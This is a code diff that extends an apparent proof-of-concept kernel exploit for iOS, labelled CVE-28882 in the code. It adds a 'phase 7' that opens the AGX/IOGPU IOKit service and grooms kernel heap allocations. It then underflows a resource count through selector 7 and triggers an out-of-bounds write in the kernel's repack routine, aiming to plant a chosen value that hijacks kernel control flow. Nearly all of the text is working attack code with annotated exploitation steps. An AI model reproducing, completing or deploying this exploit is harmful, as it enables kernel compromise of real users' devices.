@@ -685,6 +685,102 @@ static void trigger_phase6(io_connect_t conn) {
     evf("[P6] DONE — if panic with GPR=0x%016llx: F-109 chain confirmed -> F-74", COMMPAGE_FLAG);
 }
 
+/*
+ * trigger_phase7: F-109 integer underflow via sel=7 (s_group_remove_resources, scalar).
+ *
+ * Kernelcache string table confirms sel=7 immediately follows sel=6 (SGAR):
+ *   sel 6 = s_group_add_resources   (dispatch string[6]='1', struct)
+ *   sel 7 = s_group_remove_resources (dispatch string[7]='2', scalar)
+ *
+ * sel=7 takes 2 scalars: (group_id, count_to_remove).
+ * Phase 6 called sel=7 with only 1 scalar — this phase uses both.
+ *
+ * Underflow chain:
+ *   1. SGAR(gid, count=4) -> kernel COUNT[obj+0x424] = 4
+ *   2. sel7(gid, 5)       -> COUNT = 4 - 5 = -1 (no bounds check)
+ *   3. SGAR(gid, count=1) -> triggers repack(COUNT=-1) -> F-109 backward OOB
+ *   4. str w19, [alloc_ptr-16] -> writes to preceding kalloc_type_var element
+ *   5. With groom count=15: element[8..11] = 0xFFFFC330, element[12..15] = 0x0000000F
+ *   6. Combined = 0x0000000FFFFFC330 = COMMPAGE_FLAG
+ *   7. ipc_kobject_server dispatches through corrupted port -> PAC fail -> X16 = COMMPAGE_FLAG
+ */
+#define SGRR_SELECTOR   7   /* s_group_remove_resources */
+#define P7_GROOM_COUNT  512
+
+static void trigger_phase7(io_connect_t conn) {
+    evf("[P7] START: F-109 via sel=7 (s_group_remove_resources, 2-scalar underflow)");
+
+    /* Groom kalloc_type_var with count=15 groups.
+     * Each 24-byte element: [0..3]=group_id, [4..7]=pad, [8..11]=obj_ptr_lo,
+     * [12..15]=count (=0x0F), [16..23]=pad.
+     * F-109 writes w19 (resource_ptr_lo) to preceding_element[8..11].
+     * With w19=0xFFFFC330: element[8..11]=0xFFFFC330, [12..15]=0x0F
+     * -> 8 bytes = 0x0000000FFFFFC330 = COMMPAGE_FLAG */
+    uint32_t g7_groom[P7_GROOM_COUNT];
+    int g7_valid = 0;
+    for (int gi = 0; gi < P7_GROOM_COUNT; gi++) {
+        uint64_t g = try_sgar_q(conn, 15);
+        if (g) g7_groom[g7_valid++] = (uint32_t)g;
+    }
+    evf("[P7] GROOM: %d/%d count=15 groups (kalloc_type_var)", g7_valid, P7_GROOM_COUNT);
+
+    /* Step 1: Create G_TARGET with count=4 (non-zero, so underflow crosses zero) */
+    uint64_t g_target = try_sgar_q(conn, 4);
+    evf("[P7] G_TARGET count=4: gid=0x%llx", g_target);
+    if (!g_target) { evf("[P7] ABORT: cannot create G_TARGET"); return; }
+
+    /* Step 2: Call s_group_remove_resources (sel=7) with (g_target, 5).
+     * count goes 4 - 5 = -1 = 0xFFFFFFFF (no bounds check in kernel). */
+    uint64_t rm7_in[2] = { g_target, 5 };
+    uint32_t rm7_cnt = 0; uint64_t rm7_out[4] = {0}; size_t rm7_sz = sizeof(rm7_out);
+    kern_return_t rm7_kr = IOConnectCallMethod(conn, SGRR_SELECTOR,
+        rm7_in, 2, NULL, 0, NULL, &rm7_cnt, rm7_out, &rm7_sz);
+    evf("[P7] REMOVE(g_target, 5) sel=7 kr=0x%x -> COUNT should be -1", rm7_kr);
+
+    /* Step 3: SGAR(g_target, count=1) -> triggers IOGPUResidentMemorySet::repack()
+     * with COUNT=-1. Repack computes: alloc_size = -1*24+8 = -16 (int32).
+     * IOMallocTypeVar(-16) -> allocates preceding element, returns ptr P.
+     * str w19, [P-16] -> writes resource_handle_lo to preceding_element+8.
+     * With groom element having count=15 at [12..15]:
+     * combined [8..15] = 0x0000000FFFFFC330 = COMMPAGE_FLAG */
+    static uint8_t add7_s[SGAR_STRUCT_SIZE];
+    uint8_t add7_out[0x10]; size_t add7_sz = sizeof(add7_out); uint32_t add7_cnt = 0;
+    memset(add7_s, 0, sizeof(add7_s));
+    *(uint32_t *)(add7_s + 0x00) = (uint32_t)g_target;
+    *(uint32_t *)(add7_s + 0x04) = (uint32_t)(g_target >> 32);
+    *(uint32_t *)(add7_s + SGAR_COUNT_OFFSET) = 1;
+    *(uint32_t *)(add7_s + 0x28) = (uint32_t)(COMMPAGE_FLAG & 0xFFFFFFFF);
+    *(uint32_t *)(add7_s + 0x2C) = (uint32_t)(COMMPAGE_FLAG >> 32);
+    kern_return_t add7_kr = IOConnectCallMethod(conn, SGAR_SELECTOR,
+        NULL, 0, add7_s, sizeof(add7_s), NULL, &add7_cnt, add7_out, &add7_sz);
+    evf("[P7] REPACK_TRIGGER: SGAR(g_target,1) kr=0x%x", add7_kr);
+
+    /* Also try direct sel=7 with count=5 on a NEW count=0 group (underflow to -1) */
+    uint64_t g7b = try_sgar_q(conn, 0);
+    evf("[P7] G_ZERO2: gid=0x%llx", g7b);
+    if (g7b) {
+        uint64_t rm7b_in[2] = { g7b, 1 };
+        uint32_t rm7b_cnt = 0; uint64_t rm7b_out[4] = {0}; size_t rm7b_sz = sizeof(rm7b_out);
+        kern_return_t rm7b_kr = IOConnectCallMethod(conn, SGRR_SELECTOR,
+            rm7b_in, 2, NULL, 0, NULL, &rm7b_cnt, rm7b_out, &rm7b_sz);
+        evf("[P7] REMOVE(g_zero2, 1) kr=0x%x -> COUNT -1", rm7b_kr);
+
+        static uint8_t add7b_s[SGAR_STRUCT_SIZE];
+        uint8_t add7b_out[0x10]; size_t add7b_sz = sizeof(add7b_out); uint32_t add7b_cnt = 0;
+        memset(add7b_s, 0, sizeof(add7b_s));
+        *(uint32_t *)(add7b_s + 0x00) = (uint32_t)g7b;
+        *(uint32_t *)(add7b_s + 0x04) = (uint32_t)(g7b >> 32);
+        *(uint32_t *)(add7b_s + SGAR_COUNT_OFFSET) = 1;
+        *(uint32_t *)(add7b_s + 0x28) = (uint32_t)(COMMPAGE_FLAG & 0xFFFFFFFF);
+        *(uint32_t *)(add7b_s + 0x2C) = (uint32_t)(COMMPAGE_FLAG >> 32);
+        kern_return_t add7b_kr = IOConnectCallMethod(conn, SGAR_SELECTOR,
+            NULL, 0, add7b_s, sizeof(add7b_s), NULL, &add7b_cnt, add7b_out, &add7b_sz);
+        evf("[P7] REPACK_TRIGGER2: SGAR(g_zero2,1) kr=0x%x", add7b_kr);
+    }
+
+    evf("[P7] DONE — if panic with GPR=0x%016llx -> F-109 CONFIRMED -> F-74 path", COMMPAGE_FLAG);
+}
+
 static void trigger_bof_iokit(void) {
     evf("[BOF] IOKIT_START sel=%d struct=0x%x count_off=0x%x",
         SGAR_SELECTOR, SGAR_STRUCT_SIZE, SGAR_COUNT_OFFSET);
@@ -911,6 +1007,34 @@ void run_cve28882_poc(UIWindow *window) {
                             trigger_phase6(conn6);
                             IOServiceClose(conn6);
                             evf("[P6] CONN6 closed");
+
+                            /* Phase 7: F-109 via sel=7 (s_group_remove_resources) 2-scalar */
+                            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 3*NSEC_PER_SEC),
+                                           dispatch_get_main_queue(), ^{
+                                mach_port_t mp7 = 0;
+                                IOMasterPort(MACH_PORT_NULL, &mp7);
+                                io_connect_t conn7 = 0;
+                                const char *svc7[] = { "AGXAcceleratorG18P", "IOGPU", "AGXAccelerator", NULL };
+                                for (int si7 = 0; svc7[si7] && !conn7; si7++) {
+                                    CFMutableDictionaryRef m7 = IOServiceMatching(svc7[si7]);
+                                    io_iterator_t it7 = 0;
+                                    IOServiceGetMatchingServices(mp7, m7, &it7);
+                                    io_service_t sv7 = IOIteratorNext(it7);
+                                    IOObjectRelease(it7);
+                                    if (!sv7) continue;
+                                    kern_return_t kr7 = IOServiceOpen(sv7, mach_task_self(), 1, &conn7);
+                                    IOObjectRelease(sv7);
+                                    if (kr7 != 0) conn7 = 0;
+                                }
+                                if (conn7) {
+                                    evf("[P7] CONN7 ready=0x%x", conn7);
+                                    trigger_phase7(conn7);
+                                    IOServiceClose(conn7);
+                                    evf("[P7] CONN7 closed");
+                                } else {
+                                    evf("[P7] CONN7 failed: cannot open for Phase 7");
+                                }
+                            });
                         } else {
                             evf("[P6] CONN6 failed: cannot open for Phase 6");
                         }
